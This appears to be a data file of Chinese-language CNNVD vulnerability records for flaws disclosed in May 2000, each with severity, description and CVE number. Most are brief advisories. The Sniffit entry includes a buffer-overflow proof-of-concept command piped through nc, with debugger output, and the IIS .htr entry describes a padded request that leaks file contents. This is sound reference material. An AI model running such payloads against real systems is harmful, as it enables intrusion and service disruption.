+Eudora 安全漏洞,CNNVD-200005-005,2000-05-01,2022-08-18,高危,其他,Eudora 4.1存在安全漏洞，远程攻击者可以通过发送超长文件名的附件触发拒绝服务。,CVE-1999-0427
+Linux kernel knfsd NFS漏洞,CNNVD-200005-008,2000-05-01,2010-12-02,低危,授权问题,Linux kernel 2.2.x的knfsd NFS 服务器存在漏洞，远程攻击者可以利用负值触发拒绝服务。,CVE-2000-0344
+Omnis Studio 2.4数据库域弱加密漏洞,CNNVD-200005-006,2000-05-01,2005-10-20,超危,授权问题,Omnis Studio 2.4使用弱加密(trivial encoding)加密数据库域，存在漏洞，,CVE-2000-0449
+网络沟通软件WebShield SMTP 4.5.44缓冲区溢出漏洞,CNNVD-200005-001,2000-05-01,2005-05-02,高危,授权问题,WebShield SMTP 4.5.44 存在缓冲区溢出漏洞，远程攻击者可以通过超长WebShield远程管理服务器的配置参数执行任意命令。,CVE-2000-0447
+SuSE aaa_base漏洞,CNNVD-200005-016,2000-05-02,2010-12-02,中危,授权问题,SuSE aaa_base包安装home目录集的系统账号到/tmp目录下存在漏洞，本地用户可以通过生成标准用户启动脚本例如profiles获得这些账号的权限。,CVE-2000-0433
+S.u.S.E. Linux任意文件删除漏洞,CNNVD-200005-014,2000-05-02,2005-10-20,低危,授权问题,SuSE Linux 6.3的aaa_base和早期版本的cron.daily 存在漏洞，本地用户可以通过生成包含空格文件名的文件删除任意文件。此时在从/tmp目录下删除过期文件时aaa_base便不能正确解析，,CVE-2000-0293
+Sniffit处理邮件头缓冲区溢出漏洞,CNNVD-200005-011,2000-05-02,2005-10-20,超危,授权问题,"Sniffit是一个常用的sniffer工具。可运行在多种Unix/Linux平台上。 它存在一个缓冲区溢出漏洞，可能导致攻击者远程获取root权限。 Sniffit在使用""-L mail""参数处理窃听到的邮件头(""mail from:""和""rcpto to:"")的时候，会将它们拷贝到一个固定大小的buffer中，导致可能发生溢出问题：问题处在下列两个地方： if(strstr(workbuf1，""mail from"")!=NULL) { char workbuf2[MTU]; strcpy(workbuf2， strstr(workbuf1，""mail from"")); 和 if(strstr(workbuf1，""rcpt to"")!=NULL) { char workbuf2[MTU]; strcpy(workbuf2， strstr(workbuf1，""rcpt to"")); ... 当用户对局域网内任意主机的25端口发送包含超长""mail from:...""或者""rcpt to:...""内容的消息时，将会导致监听主机上的Sniffit发生溢出： echo ""mail from:`perl -e 'print ""A""x300'`""|nc -vv HOSTNAME 25 在运行Sniffit的机器上用gdb跟踪得到的结果： Program received signal SIGSEGV， Segmentation fault. 0x61616161 in ?? () (gdb) i all eax: 0x0 0 ecx: 0x8057648 134575688 edx: 0x8057648 134575688 ebx: 0xbfff5b84 -1073783932 esp: 0xbfff47a4 -1073789020 ebp: 0x61616161 1633771873 esi: 0xbfff6f0c -1073778932 edi: 0xbfff6f0c -1073778932 eip: 0x61616161 1633771873 ...",CVE-2000-0343
+FileMaker Web Companion漏洞,CNNVD-200005-012,2000-05-02,2010-12-02,高危,授权问题,FileMaker Pro 5 Web Companion存在漏洞，远程攻击者可以利用这个漏洞发送匿名或伪造邮件。,CVE-2000-0386
+FileMaker Web Companion漏洞,CNNVD-200005-010,2000-05-02,2010-12-02,中危,授权问题,FileMaker Pro 5 Web Companion存在漏洞，远程攻击者可以通过XML publishing或email capabilities绕过Field-Level数据库安全限制。,CVE-2000-0385
+system漏洞,CNNVD-200005-009,2000-05-02,2010-12-02,中危,授权问题,"系统安装有分布式拒绝服务(DDOS)的主控，代理或僵尸软件，例如 (1) Trinoo, (2) Tribe Flood Network (TFN), (3) Tribe Flood Network 2000 (TFN2K), (4) stacheldraht, (5) mstream, or (6) shaft",CVE-2000-0138
+AppleShare IP 6.x无效围请求漏洞,CNNVD-200005-013,2000-05-02,2005-05-02,低危,其他,AppleShare IP 6.1和后期版本存在漏洞，远程攻击者可以通过对web服务器的无效围请求读取潜在敏感信息。,CVE-2000-0346
+Microsoft Windows 9x SMB_COM_SEND_SINGLE_BLOCK(0xD0)拒绝服务攻击漏洞,CNNVD-200005-015,2000-05-02,2005-05-02,低危,其他,Windows 95/98是Microsoft公司开发的流行的通用操作系统。 Windows 95/98在处理winpopup消息时存在漏洞，远程攻击者可能利用此漏洞对机器进行拒绝服务攻击。 当Windows 95/98收到一个畸型的winpopup消息时，Windows 95/98发生不可预料的错误：系统崩溃、蓝屏、重起动、死锁或者丢失网络连接等等。 执行nbtstat -A <windows9x_victim_ip>，如果看到 VICTIM <03> UNIQUE Registered 并且可以telnet <victim ip> 139的话，就可能受此漏洞影响。,CVE-2000-0347
+id软件的Quake3Arena目录遍历漏洞,CNNVD-200005-018,2000-05-03,2005-05-02,低危,授权问题,Quake3 平台存在漏洞，恶意的服务器操作者可以通过点点(..)攻击读取或修改客户端的文件。,CVE-2000-0303
+多个Linux厂商的pam_console漏洞,CNNVD-200005-020,2000-05-03,2005-05-02,高危,授权问题,Linux系统下的pam_console PAM模块有根据登陆用户修改多个设备文件属主的作用，但在用户退出登陆后，打开文件描述符仍将维护这些设备，随后的用户可以利用这个漏洞在登陆时做嗅探行为。,CVE-2000-0378
+Cisco路由器在线帮助漏洞,CNNVD-200005-023,2000-05-03,2005-10-20,低危,授权问题,"Cisco路由器中的在线帮助系统选项存在漏洞，无权限的用户可以通过show 命令在没有""enabled""选项时访问并获得敏感信息。",CVE-2000-0345
+L-Soft Listserv 1.8 Web Archives的缓冲区溢出漏洞,CNNVD-200005-021,2000-05-03,2005-07-27,高危,授权问题,L-Soft LISTSERV 1.8 的Web Archives组件存在缓冲区溢出漏洞，远程攻击者可以利用这个漏洞执行任意命令。,CVE-2000-0425
+"Cart32 ""expdate"" 管理信息泄露漏洞",CNNVD-200005-022,2000-05-03,2005-05-02,低危,授权问题,Cart32存在漏洞，远程攻击者可以通过在URL请求中附加/expdate访问敏感调试信息。,CVE-2000-0430
+glibc漏洞,CNNVD-200005-017,2000-05-03,2010-12-02,高危,授权问题,glibc 2.1.3的解析器使用可预测的ID号存在漏洞，本地攻击者可以利用这个漏洞欺骗DNS的查询结果。,CVE-2000-0335
+UltraBoard 漏洞,CNNVD-200005-019,2000-05-03,2010-12-02,低危,授权问题,UltraBoard 1.6 的UltraBoard.pl或UltraBoard.cgi公共网关接口存在漏洞，远程攻击者可以通过包含点点(..)和末端空字节的路径名字符串读取任意文件。,CVE-2000-0332
+Aladdin Knowledge Systems eToken PIN Extraction 漏洞,CNNVD-200005-026,2000-05-04,2005-05-02,中危,授权问题,Aladdin Knowledge Systems eToken设备存在漏洞，攻击者可以在不知道PIN所有者的情况下，通过复位EEPROM中PIN的物理手段访问设备的敏感信息。,CVE-2000-0427
+Netwin Dmailweb Server utoken 缓冲区溢出漏洞,CNNVD-200005-024,2000-05-04,2005-10-20,中危,授权问题,Netwin DMailWeb公共网关接口存在缓冲区溢出漏洞，远程攻击者可以通过超长utoken参数执行任意命令。,CVE-2000-0422
+HP-UX关机缓冲区溢出漏洞,CNNVD-200005-027,2000-05-04,2005-05-02,中危,授权问题,HP-UX 11.X and 10.X的关机指令存在漏洞，本地用户可以通过异常输入变量获取特权。,CVE-2000-0414
+InterScan VirusWall 文件名转换器缓冲区溢出漏洞,CNNVD-200005-025,2000-05-04,2005-05-02,高危,授权问题,InterScan Virus Wall 3.32和早期版本的SMTP网关存在缓冲区溢出漏洞，远程攻击者可以通过转换器附件的超长文件名执行任意命令。,CVE-2000-0428
+Gossamer Threads DBMan 信息泄露漏洞,CNNVD-200005-028,2000-05-05,2005-07-27,中危,授权问题,Gossamer Threads DBMan db.cgi的公共网关接口脚本存在漏洞，远程攻击者可以通过在db参数中引用不存在的数据库查看环境变量和设置信息。,CVE-2000-0381
+Netwin DNews News Server的缓冲区溢出漏洞,CNNVD-200005-029,2000-05-05,2005-10-20,低危,授权问题,"Netwin DNEWSWEB公共网关程序存在缓冲区溢出漏洞，远程攻击者可以通过例如group, cmd, and utag的超长参数执行任意命令。",CVE-2000-0423
+UltraBoard拒绝服务漏洞,CNNVD-200005-030,2000-05-05,2005-05-02,低危,授权问题,UltraBoard 1.6 和其他版本存在漏洞，远程攻击者可以通过在Session参数中引用UltraBoard，导致UltraBoard创建自身进程的拷贝，触发拒绝服务。,CVE-2000-0426
+Microsoft Frontpage服务器扩展shtml.exe/shtml.dll绝对路径泄露漏洞,CNNVD-200005-031,2000-05-06,2005-10-20,低危,授权问题,FrontPage 98 Extensions是Microsoft的一个产品，包括PWS和IIS版本，可以让网页设计人员方便的直接用FrontPage直接连接到PWS或者IIS上进行网页创作。shtml.exe和shtml.dll 是FrontPage服务器扩展的组件之一。 shtml.exe和shtml.dll存在一个设计失误可导致服务器绝对路径泄露。 1.1版本以下的FrontPage，当shtml.exe或shtml.dll收到请求处理一个不存在的文件时，会报告一个错误，在这个错误信息中会泄露服务器当前的绝对路径。 攻击者由此可以得知Web服务器主目录安装的绝对路径。,CVE-2000-0413
+AOL Instant Messenger路径泄露漏洞,CNNVD-200005-034,2000-05-08,2005-10-20,低危,授权问题,AOL Instant Messenger (AIM)的文件转换组件将转换文件的物理路径泄露给了远程接收者。,CVE-2000-0383
+NetStructure 7110 未公开密码漏洞,CNNVD-200005-033,2000-05-08,2006-08-09,超危,授权问题,"NetStructure 7110 和 7180存在未公开账号(servnow, root, and wizard)，这些账号可以轻易从 NetStructure的MAC地址得到，远程攻击者可以利用这个漏洞获取根用户权限。",CVE-2000-0384
+Allaire ClusterCATS URL重定向漏洞,CNNVD-200005-032,2000-05-08,2005-05-02,低危,授权问题,ColdFusion ClusterCATS 在HTML重定向时附加过期请求字符串参数，存在漏洞，可能提供重定向站点敏感信息。,CVE-2000-0382
+golddig X11 Game 的任意文件覆写漏洞,CNNVD-200005-035,2000-05-09,2005-07-27,低危,授权问题,FreeBSD集成端口的golddig game中的makelev程序存在漏洞，远程攻击者可以利用这个漏洞覆写任意文件。,CVE-2000-0387
+Allaire ColdFusion 4.5.1缓存文件请求拒绝服务漏洞,CNNVD-200005-039,2000-05-10,2005-05-02,低危,其他,ColdFusion Server 4.5.1存在漏洞，远程攻击者可以通过对内存中并不存在的CFCACHE 标记的缓存文件发出重复请求触发拒绝服务。,CVE-2000-0410
+Matt Wright FormMail 环境变量泄露漏洞,CNNVD-200005-037,2000-05-10,2005-05-02,低危,授权问题,Matt Wright's FormMail公共网关接口脚本存在漏洞，远程攻击者可以通过env_report参数获取环境变量。,CVE-2000-0411
+Netscape Navigator 和Communicator无效SSL证书警告旁路漏洞,CNNVD-200005-038,2000-05-10,2005-10-12,低危,授权问题,"Netscape Communicator4.73以前的版本和Navigator 4.07没有正确处理无效SSL证书，存在漏洞，远程攻击者可以通过重定向合法web服务器到自身恶意服务器窃取信息，也称""Acros-Suencksen SSL"" 漏洞。",CVE-2000-0406
+Netscape 通信机 /tmp 符号链接漏洞,CNNVD-200005-040,2000-05-10,2005-05-02,低危,授权问题,Netscape 4.73和早期版本的符号链接在导入新蛋证书时存在漏洞，本地用户可以利用这个漏洞将自身的证书导入覆盖原有文件。,CVE-2000-0409
+Microsoft IIS 4.0/5.0畸形.HTR请求拒绝服务攻击漏洞(MS00-031),CNNVD-200005-036,2000-05-10,2005-10-12,中危,授权问题,IIS是一款Windows NT/2000系统自带的的Web服务器软件，由Microsoft公司开发维护。IIS支持对一些特定文件名后缀(如.ASP、.IDC、.HTR)的文件请求执行进一步的处理，当服务器接到此类文件的请求时，每种后缀的文件由一个特定的DLL文件处理。ISM.DLL用于处理.HTR、.STM、.IDC为后缀的文件请求。 IIS在处理畸形的.htr请求时会导致服务器CPU占用率100%，必须重新启动才能恢复功能。 包含在虚拟目录中的.htr程序允许用户远程更改口令。如果用户提交一个畸形的更改口令请求就会使服务器的CPU占用率达到100%，必须重新启动才能恢复。目前具体的漏洞细节尚未披露。,CVE-2000-0304
+Bugzilla远程任意命令这些漏洞,CNNVD-200005-041,2000-05-11,2005-05-02,高危,授权问题,Bugzilla 中的process_bug.cgi脚本存在漏洞，远程攻击者可以通过shell元字符执行任意命令。,CVE-2000-0421
+NTMail Server 5.x 代理访问漏洞,CNNVD-200005-045,2000-05-11,2005-05-02,中危,授权问题,NTMail 5.x存在漏洞，网络用户可以通过重定位请求到NTMail的web配置服务器绕过NTMail代理限制。,CVE-2000-0416
+Microsoft Office 2000 UA Control漏洞,CNNVD-200005-044,2000-05-11,2005-10-12,高危,授权问题,"The Office 2000 UA ActiveX Control标记为""安全脚本处理""，存在漏洞，远程攻击者可以通过Office帮助中的""Show Me""功能执行非法操作，也称""Office 2000 UA Control"" 漏洞。",CVE-2000-0419
+Microsoft Internet Explorer 安全漏洞,CNNVD-200005-042,2000-05-11,2021-07-26,低危,其他,"Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Internet Explorer 4.0 and 5.0存在安全漏洞，攻击者可以通过包含URL中的域名和转义字符获取用户cookie文件，也称""非法 Cookie 访问""漏洞。",CVE-2000-0439
+Microsoft IIS 4.0/5.0 .HTR文件名截断泄漏文件内容漏洞(MS00-031),CNNVD-200005-043,2000-05-11,2005-10-12,中危,授权问题,IIS是一款Windows NT/2000系统自带的的Web服务器软件，由Microsoft公司开发维护。IIS支持对一些特定文件名后缀(如.ASP、.IDC、.HTR)的文件请求执行进一步的处理，当服务器接到此类文件的请求时，每种后缀的文件由一个特定的DLL文件处理。ISM.DLL用于处理.HTR、.STM、.IDC为后缀的文件请求。 Cerberus 安全小组发现微软的IIS 4/5存在一个缺陷，允许攻击者访问那些本来无权访问的文件。比如/scripts目录下的文本文件(.txt、.log、.ini)通常是不可访问的，因为这个虚拟目录只有执行权限。利用这个缺陷，就有可能访问得到这些文本文件的内容。 通过给IIS提供一个特殊格式的请求，有可能获得这些文件的内容。提供一个请求，文件名后跟随大约230个空格(+或者%20)，以.htr做后缀，于是IIS认为客户端正在请求一个.htr文件。.htr扩展文件被映射成 ISM.DLL ISAPI 应用程序，IIS会重定向所有针对.htr资源的请求到 ISM.DLL ，ISM.DLL 打开这个文件并执行之。 但是在这样做之前，ISM.DLL 会截断送给自己的缓冲区内容，去掉.htr后缀以及结尾的空格，于是我们想访问的文件内容被返回。这种攻击只能进行一次，直到WWW服务重启，将无法进行第二次攻击。此外，如果已经提交过一个.htr请求给目标主机，攻击也会失败。这个缺陷仅仅在ISM.DLL被调入内存后的第一时刻有效。,CVE-2000-0457
+Microsoft IIS 4.0/5.0异常文件扩展名拒绝服务漏洞,CNNVD-200005-046,2000-05-11,2005-10-12,低危,其他,"IIS 4.05 and 5.0存在漏洞，远程攻击者通过通常包含超大文件扩展名数量的超长和复杂的URL触发拒绝服务，也称""URL中的异常扩展数据""漏洞。",CVE-2000-0408
+Microsoft Windows 2000 默认系统密钥配置漏洞,CNNVD-200005-047,2000-05-11,2005-10-20,高危,配置错误,Windows 2000的系统密码配置将启动密钥存放在注册表中，存在漏洞，攻击者可以利用这个漏洞通过查找到的启动密钥破解文件加密系统(EFS) 数据。,CVE-2000-0420
+Microsoft Outlook 98 / Outlook Express 4.x长文件名漏洞,CNNVD-200005-048,2000-05-12,2005-10-20,低危,授权问题,Outlook Express 4.x 存在缓冲区溢出漏洞，攻击者可以通过邮件货包含a .jpg or .bmp 的超长文件名留言触发拒绝服务。,CVE-2000-0415
+Solaris netpr 缓冲区溢出漏洞,CNNVD-200005-049,2000-05-12,2005-05-02,高危,授权问题,Solaris netpr程序存在缓冲区溢出漏洞，本地用户可以通过超长-p选项执行任意命令。,CVE-2000-0407
+Allmanage管理员密码检索漏洞,CNNVD-200005-051,2000-05-13,2005-05-02,高危,配置错误,allmanageup.pl文件上传Allmanage Website administration software 2.6 的CGI脚本存在漏洞，远程攻击者可以直接调用来修改用户账号和web页面。,CVE-2000-0435
+Allmanage管理员密码检索漏洞,CNNVD-200005-050,2000-05-13,2005-10-20,高危,配置错误,Allmanage web站点管理软件的管理员密码以明文形式存放，攻击者可以利用这个漏洞远程访问站点。,CVE-2000-0434
+Microsoft Active Movie Control文件类型漏洞,CNNVD-200005-052,2000-05-13,2005-10-20,中危,授权问题,Internet Explorer 5中的Microsoft Active Movie ActiveX Control没有限制下载文件类型，存在漏洞，攻击者可以通过email消息或新闻贴解码之后下载任何文件到本地系统。,CVE-2000-0400
+George Burgyan CGI Counter输入验证漏洞,CNNVD-200005-053,2000-05-15,2005-05-02,高危,授权问题,George Burgyan的The CGI counter 4.0.7 存在漏洞，远程攻击者可以通过shell元字符执行任意命令。,CVE-2000-0424
+Seattle Lab Emurl 2.0 Email Account 账号访问漏洞,CNNVD-200005-054,2000-05-15,2005-05-02,中危,授权问题,The EMURL web-based email account软件在用户会话URLs编码标识符可预测，存在漏洞，远程攻击者可以利用这个漏洞访问用户email账户。,CVE-2000-0397
+多个厂商Kerberos 5/Kerberos 4 兼容问题的krb_rd_req()函数的缓冲区错误漏洞,CNNVD-200005-058,2000-05-16,2020-01-22,超危,其他,Kerberos 5的krb425_conv_principal函数存在缓冲区溢出漏洞，远程攻击者可以利用这个漏洞获取根权限。,CVE-2000-0390
+多个厂商Kerberos 5/Kerberos 4 兼容问题的krb_rd_req()函数的缓冲区错误漏洞,CNNVD-200005-064,2000-05-16,2020-01-22,超危,其他,Kerberos 5中的ksu存在缓冲区溢出漏洞，远程攻击者可以利用这个漏洞获取根权限。,CVE-2000-0391
+Netopia DSL路由器漏洞,CNNVD-200005-056,2000-05-16,2005-05-02,低危,授权问题,The Netopia R9100路由器没能阻止合法用户修改SNMP表，即使管理员通过配置路由器要求它这样做也无效。,CVE-2000-0379
+Windows NT Service漏洞,CNNVD-200005-063,2000-05-16,2010-12-02,低危,授权问题,Windows NT Service控制管理器(SCM)存在漏洞，远程攻击者可以通过在资源枚举请求中的异常参数触发拒绝服务。,CVE-1999-0980
+AntiSniff DNS缓冲区溢出漏洞。,CNNVD-200005-060,2000-05-16,2005-05-02,高危,授权问题,L0pht AntiSniff 存在缓冲区溢出漏洞，远程攻击者可以通过异常DNS响应包执行任意命令。,CVE-2000-0405
+多个厂商Kerberos 5/Kerberos 4 兼容问题的krb_rd_req()函数的缓冲区错误漏洞,CNNVD-200005-062,2000-05-16,2020-01-22,高危,其他,Kerberos 5中的ksu存在缓冲区溢出漏洞，本地用户可以利用这个漏洞获取根权限。,CVE-2000-0392
+calender.pl/calendar_admin.pl脚本远程执行任意命令漏洞,CNNVD-200005-061,2000-05-16,2012-11-28,高危,授权问题,CalendarScript是一个基于Web的事件安排、管理、发布软件包。 软件包中的calender.pl和calendar_admin.pl脚本实现上存在输入验证漏洞，远程攻击者利用此漏洞通过shell字符执行任意命令。calendar_admin.pl脚本提示用户修改配置文件，但是它在验证用户的时候已经访问了指定的配置文件，而且直接使用perl的open()调用用户输入的数据，恶意用户可以使用管道符执行后面的命令。,CVE-2000-0432
+KDE kscd SHELL 环境变量漏洞,CNNVD-200005-059,2000-05-16,2005-05-02,高危,其他,The KDE kscd程序在执行指定用户SHELL 环境变量的程序时没有降低权限，存在漏洞，用户可以通过执行指定交替程序获取特权。,CVE-2000-0393
+多个厂商Kerberos 5/Kerberos 4 兼容问题的krb_rd_req()函数的缓冲区错误漏洞,CNNVD-200005-057,2000-05-16,2020-01-22,超危,其他,Kerberos 4 and 5 的krb_rd_req函数存在缓冲区溢出漏洞，远程攻击者可以利用这个漏洞获取根权限。,CVE-2000-0389
+CProxy 3.3 SP2 缓冲区溢出拒绝服务漏洞,CNNVD-200005-055,2000-05-16,2005-05-02,低危,授权问题,CProxy 3.3存在缓冲区溢出漏洞，远程用户可以通过超长HTTP请求触发拒绝服务。,CVE-2000-0395
+Microsoft Internet Explorer 安全漏洞,CNNVD-200005-067,2000-05-17,2021-07-26,高危,其他,"Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Internet Explorer 4.x 版本和5.x版本存在安全漏洞。远程攻击者借助ActiveX参数分析能力的缓冲区溢出可以执行任意命令，又称为""Malformed Component Attribute"" 漏洞。",CVE-2000-0464
+FreeBSD 和Linux Mandrake 'xsoldier'缓冲区溢出漏洞,CNNVD-200005-069,2000-05-17,2005-05-02,高危,授权问题,xsoldier程序存在漏洞。本地用户借助超长参数可以提升根访问权。,CVE-1999-1008
+互联网安全系统ICECap管理器默认用户名和密码漏洞,CNNVD-200005-065,2000-05-17,2005-05-02,中危,授权问题,NetworkICE ICEcap 2.0.23和更早的版本中调试功能失效。远程攻击者利用此漏洞可以绕过弱认证并登记未加密事件。,CVE-2000-0350
+Cayman 3220-H DSL路由器DoS漏洞,CNNVD-200005-066,2000-05-17,2005-05-02,低危,授权问题,Cayman 3220-H DS的HTTP管理接口存在漏洞。远程攻击者借助超长用户名或密码可以导致拒绝服务。,CVE-2000-0417
+Microsoft Internet Explorer 安全漏洞,CNNVD-200005-068,2000-05-17,2021-07-26,中危,其他,"Microsoft Internet Explorer（IE）是美国微软（Microsoft）公司的一款Windows操作系统附带的Web浏览器。 Microsoft Internet Explorer存在安全漏洞。Internet Explorer 4.x 版本和5.x版本无法正确地验证浏览器窗口中的帧域。远程攻击者借助帧可以读取客户端资料，又称为""Frame Domain Verification"" 漏洞。",CVE-2000-0465
+Gauntlet防火墙远程缓冲区溢出漏洞,CNNVD-200005-073,2000-05-18,2005-10-12,超危,授权问题,"gauntlet和WebShield中CyberPatrol守护程序""cyberdaemon""存在缓冲区溢出漏洞。远程攻击者利用此漏洞导致拒绝服务或执行任意文件。",CVE-2000-0437
+BeOS TCP碎片远程DoS漏洞,CNNVD-200005-070,2000-05-18,2005-05-02,低危,授权问题,BeOS 5.0版本存在漏洞。远程攻击者借助破碎的TCP包导致拒绝服务。,CVE-2000-0463
+XFree86 Xserver拒绝服务漏洞,CNNVD-200005-074,2000-05-18,2005-05-02,低危,授权问题,XFree86 3.3.x 版本和4.0版本存在漏洞。远程攻击者借助发送到端口6000的畸形IP包中负的计数器值导致拒绝服务漏洞。,CVE-2000-0453
+Axent NetProwler畸形IP包DoS漏洞,CNNVD-200005-072,2000-05-18,2005-05-02,低危,其他,NetProwler 3.0存在漏洞。远程攻击者通过传送触发NetProwler中Man-in-the-Middle签名的畸形IP包导致拒绝服务漏洞。,CVE-2000-0394
+Big Brother bbd.c缓冲区溢出漏洞,CNNVD-200005-071,2000-05-18,2005-10-20,中危,授权问题,Big Brother System和Network Monitor中bbd服务器存在漏洞。攻击者利用此漏洞可以执行任意命令。,CVE-2000-0450
+MetaProducts Offline Explorer目录遍历漏洞,CNNVD-200005-078,2000-05-19,2005-05-02,低危,授权问题,MetaProducts Offline Explorer 1.2和更早版本存在漏洞。远程攻击者借助..(点 点)攻击可以访问任意文件。,CVE-2000-0436
+多个供应商IP数据包碎片拒绝服务漏洞,CNNVD-200005-076,2000-05-19,2005-10-12,低危,资源管理错误,"Windows 95, Windows 98, Windows 2000, Windows NT 4.0和Terminal Server系统存在漏洞。远程攻击者通过传送大量相同的IP数据包碎片导致拒绝服务漏洞，又称为jolt2 o或""IP Fragment Reassembly"" 漏洞。",CVE-2000-0305
+Intel Express 8100 ISDN路由器ICMP碎片漏洞,CNNVD-200005-077,2000-05-19,2006-09-05,低危,其他,Intel Express 8100 ISDN路由器存在漏洞。远程攻击者通过放大或破碎的ICMP包导致拒绝服务。,CVE-2000-0451
+Multiple Linux 供应商fdmount缓冲区溢出漏洞,CNNVD-200005-079,2000-05-22,2006-09-21,高危,授权问题,"Linux系统中fdmount存在缓冲区溢出漏洞。""floppy""组中的本地用户借助超长mountpoint参数执行任意命令。",CVE-2000-0438
+Cobalt RaQ2和RaQ3访问控制漏洞,CNNVD-200005-080,2000-05-22,2006-08-28,高危,授权问题,Cobalt RaQ2和RaQ3无法正确设置借助FrontPage上传的文件的访问权和所有权。攻击者利用此漏洞可以绕过cgiwrap并修改文件。,CVE-2000-0431
+"Cayman 3220H DSL路由器 ""ping of death""漏洞",CNNVD-200005-081,2000-05-23,2005-05-02,低危,授权问题,Cayman 3220H DSL路由器存在漏洞。远程攻击者借助放大的ICMP(ping)回应请求导致拒绝服务漏洞。,CVE-2000-0418
+Danware NetOp 6.0文件传输机制访问控制漏洞,CNNVD-200005-082,2000-05-23,2005-05-02,超危,授权问题,Danware NetOp 6.0版本的文件传输机制不提供身份验证。远程攻击者借助此漏洞可以访问并修改任意文件。,CVE-2000-0551
+多个供应商PGP5自动密钥生成程序漏洞,CNNVD-200005-090,2000-05-24,2006-09-22,低危,授权问题,Unix系统中PGP 5.x 的pgpk命令使用不充分的非交互式密钥随机数据源。此漏洞可能产生可预测密钥。,CVE-2000-0445
+HP Web JetAdmin 6.0打印DoS漏洞,CNNVD-200005-088,2000-05-24,2005-10-20,低危,其他,HP Web JetAdmin 6.0版本借助端口8000的畸形URL导致拒绝服务漏洞。,CVE-2000-0444
+Pacific Software Carello文件复制及资源泄露漏洞,CNNVD-200005-089,2000-05-24,2005-05-02,低危,授权问题,Carello shopping cart软件中add.exe程序存在漏洞。远程攻击者利用此漏洞将可以复制服务器上的文件，攻击者可以读取例如.ASP文件的web脚本的源代码。,CVE-2000-0396
+AIX文件系统漏洞,CNNVD-200005-092,2000-05-24,2005-05-02,低危,授权问题,AIX 3.2.x和4.x存在漏洞。本地用户利用此漏洞可以提升本地或远程安装AIX文件系统的写访问权。,CVE-2000-0441
+Rockliffe MailSite 4.2.1.0缓冲区溢出漏洞,CNNVD-200005-087,2000-05-24,2005-05-02,超危,授权问题,Rockliffe MailSite Management Agent中wconsole.dll存在缓冲区溢出漏洞。远程攻击者借助HTTP GET请求中超长query_string参数可以执行任意命令。,CVE-2000-0398
+MDBMS缓冲区溢出漏洞,CNNVD-200005-091,2000-05-24,2005-05-02,中危,授权问题,MDBMS数据库服务器存在缓冲区溢出漏洞。远程攻击者借助超长字符串可以执行任意命令。,CVE-2000-0446
+GNOME gdm XDMCP缓冲区溢出漏洞,CNNVD-200005-086,2000-05-24,2005-10-20,超危,授权问题,"GNOME gdm,KDE kdm和wdm 的XDMCP解析代码存在缓冲区溢出漏洞。远程攻击者借助超长FORWARD_QUERY请求可以执行任意命令或导致拒绝服务。",CVE-2000-0491
+Alt-N MDaemon Mail Server DoS服务器,CNNVD-200005-083,2000-05-24,2005-05-02,低危,授权问题,MDaemon POP服务器存在缓冲区溢出漏洞。远程攻击者借助超长用户名导致拒绝服务。,CVE-2000-0399
+HP Web JetAdmin目录遍历漏洞,CNNVD-200005-085,2000-05-24,2005-05-02,中危,授权问题,HP Web JetAdmin 5.6版本的web接口服务器存在漏洞。远程攻击者借助..(点 点)攻击可以读取任意文件。,CVE-2000-0443
+Qualcomm Qpopper 'EUIDL'格式字符串输入漏洞,CNNVD-200005-084,2000-05-24,2006-08-28,高危,授权问题,Qpopper 2.53和更早的版本存在漏洞。本地用户借助格式化字符串：euidl命令处理的header可以提升特权。,CVE-2000-0442
+Microsoft Windows NT 4.0 HostAnnouncement拒绝服务漏洞,CNNVD-200005-094,2000-05-25,2005-10-12,低危,授权问题,"Windows NT 4.0版本的CIFS Computer Browser服务器存在漏洞。远程攻击者通过传送大量主浏览表要求的主机公告导致拒绝服务，又称为""HostAnnouncement Flooding""或""HostAnnouncement Frame""漏洞",CVE-2000-0403
+Microsoft Windows Computer Browser重置漏洞,CNNVD-200005-093,2000-05-25,2005-10-12,低危,授权问题,"CIFS Computer Browser服务器存在漏洞。远程攻击者通过传送ResetBrowser帧到主浏览器导致拒绝服务，又称为""ResetBrowser Frame""漏洞。",CVE-2000-0404
+Netscape 4.73证书验证漏洞,CNNVD-200005-096,2000-05-26,2005-05-02,低危,授权问题,Netscape 4.73和更早版本无法正确警告用户潜在的无效证书，如果用户以前接受了不同Web站点证书。远程攻击者利用此漏洞通过害网站的DNS信息可以欺骗合法网站。,CVE-2000-0517
+IPFilter防火墙竞争条件漏洞,CNNVD-200005-095,2000-05-26,2005-10-12,低危,授权问题,"当配置重叠的""return-rst""和 ""keep state""规则，IPFilter防火墙存在竞争条件漏洞。远程攻击者借助此漏洞可以绕过访问限制。",CVE-2000-0553
+KDE kdesud DISPLAY环境变量溢出,CNNVD-200005-097,2000-05-27,2005-05-02,高危,授权问题,Linux中KDE kdesud存在缓冲区溢出漏洞。本地用户借助超长DISPLAY环境变量可以提升特权。,CVE-2000-0460
+"NetBSD ""cpu-hog""拒绝服务漏洞",CNNVD-200005-099,2000-05-28,2005-10-12,低危,其他,"NetBSD 1.4.2和更早版本存在漏洞。本地用户通过重复运行内核中某些不服从CPU的系统调用导致拒绝服务，又称为""cpu-hog""。",CVE-2000-0456
+NetBSD ftpchroot分析漏洞,CNNVD-200005-098,2000-05-28,2005-05-02,低危,授权问题,NetBSD 1.4.2版本中ftpd无法正确解析/etc/ftpchroot条目，chroot指定用户。用户利用此漏洞可以访问主目录之外的其他文件。,CVE-2000-0462
+多个供应商BSD Semaphore IPC拒绝服务漏洞,CNNVD-200005-102,2000-05-29,2005-05-02,低危,授权问题,BSD冻结状态信号的无证semconfig系统存在漏洞。本地用户借助semconfig调用导致信号系统拒绝服务。,CVE-2000-0461
+Linux cdrecord 缓冲区溢出漏洞,CNNVD-200005-100,2000-05-29,2005-05-02,高危,授权问题,Linux cdrecord存在缓冲区溢出漏洞。本地用户借助dev参数可以提升特权。,CVE-2000-0454
+Xlockmore 4.16缓冲区溢出漏洞,CNNVD-200005-101,2000-05-29,2005-05-02,低危,授权问题,4.16及更早版本的xlockmore xlock程序存在缓冲区溢出漏洞。本地用户借助超长-mode选项可以从内存中读取敏感数据。,CVE-2000-0455
+ICQ Web Front远程DoS攻击漏洞,CNNVD-200005-103,2000-05-29,2005-10-20,低危,授权问题,"ICQ 2000a, 99b和其他版本中ICQ Web Front服务的guestbook CGI存在漏洞。远程攻击者借助超长名称参数导致拒绝服务。",CVE-2000-0564
